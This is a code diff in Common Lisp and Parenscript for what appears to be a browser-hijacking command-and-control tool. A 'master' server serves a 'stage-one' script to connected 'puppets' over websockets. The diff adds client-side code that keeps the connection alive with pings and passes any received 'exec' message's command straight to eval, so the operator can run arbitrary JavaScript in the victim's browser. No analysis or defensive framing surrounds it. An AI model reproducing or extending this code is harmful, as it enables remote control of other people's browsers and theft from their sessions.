@@ -48,14 +48,63 @@
 (defun basic-websocket-puppet (uri)
   (parenscript:ps
     (defvar *socket* (new (-Web-Socket (ps:lisp uri))))
+    (defvar *keep-alive-interval* 10000)
 
     ;; Defines the function to call as soon as the websocket is open.
     (defun on-open (event)
-      (chain *socket* (send "Hello!"))
+      (setf obj (create type "my-type"))
+      (chain *socket* (send (chain -J-S-O-N (stringify obj))))
+
+      ;; Setup the Pings.
+      (chain window (set-interval send-ping *keep-alive-interval*))
       ())
 
+    ;; Test on-message function.
     (defun on-message (event)
-	(eval "console.log('LOL');"))
+      ;; We will be parsing JSON... Let's try-catch this.
+      (try
+       (progn
+	 
+	 ;; Do the parsing
+	 (setf json
+	       (chain -J-S-O-N (parse (chain event data))))
+	 ;; If the parsing succeeded, obtain the "type" attribute.
+	 (setf type
+	       (chain json type))
+	 
+	 ;; Checks that type exists
+	 (if (not (= (typeof type) "undefined"))
+
+	     ;; If type is exec, meaning that we want to execute a command.
+	     (if (= type "exec")
+		 (progn (chain console (log "can execute!"))
+
+			;; Try to retrieve the "command" attribute.
+			(setf command (chain json command))
+
+			;; If it exists...
+			(if (not (= (typeof command) "undefined"))
+			    (progn
+			      (chain console (log (+ "Executing: " command)))
+
+			      ;; Execute!
+			      (eval command))
+			    ;; Command does not exist.
+			    (chain console (log "No command defined!"))))
+		 ;; Logs the "type" attribute, since it seems unknown.
+		 (chain console (log type)))
+	     ;; Logs that there is no type.
+	     (chain console (log "No 'type' in this JSON object."))))
+      ;; If an error was thrown, log it.
+       (:catch (e) (chain console (log "invalid JSON.")))
+      
+      ;; Logs the event that was received, just in case.
+      (chain console (log event))))
+
+    ;; Function to send a keep-alive message.
+    (defun send-ping ()
+      (setf obj (create type "ping"))
+      (chain *socket* (send (chain -j-s-o-n (stringify obj)))))
 
     ;; Binds the listener to the on-open function.
     (setf (getprop *socket* 'onopen) on-open)
@@ -68,6 +117,9 @@
 		     (get-master nil))))
     (find-if (lambda (elem) (string= (name elem) puppet-name))
 	     client-list)))
+
+(defun message (puppet message)
+  (hunchensocket:send-text-message puppet message))
 
 (defun send-stage-one ()
   (setf (hunchentoot:content-type*) "text/javascript")
@@ -130,13 +182,13 @@
   (echo :leave (format nil "Puppet ~a (~a) has disconnected from ~a." (name puppet) (name puppet) (name master)))
   ())
 
-;;(defmethod send-message (message)
-;;  )
+(defun handle-message (message) (declare (ignore message)))
 
 (defmethod hunchensocket:text-message-received ((master master) puppet message)
-  (hunchensocket:send-text-message puppet (format nil message))
-  (echo :message (format nil "New message from ~a: ~a~%" (name puppet) message))
-  (hunchensocket:send-text-message puppet (format nil "WOW")))
+  ;;(hunchensocket:send-text-message puppet (format nil message))
+  (v:log :debug :message (format nil "New message from ~a: ~a~%" (name puppet) message))
+  ;;(handle-message message)
+  )
 
 
 
